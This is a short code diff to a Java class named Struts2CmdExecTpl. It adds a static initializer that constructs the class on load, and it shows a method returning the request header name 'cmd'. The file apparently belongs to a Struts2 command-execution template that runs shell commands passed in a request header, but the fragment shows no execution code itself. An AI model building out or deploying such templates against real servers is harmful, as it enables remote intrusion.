@@ -8,6 +8,12 @@ import java.util.Scanner;
 
 public class Struts2CmdExecTpl {
 
+    static {
+        try {
+            new Struts2CmdExecTpl();
+        } catch (Exception e) {
+        }
+    }
     private String getReqHeaderName() {
         return "cmd";
     }
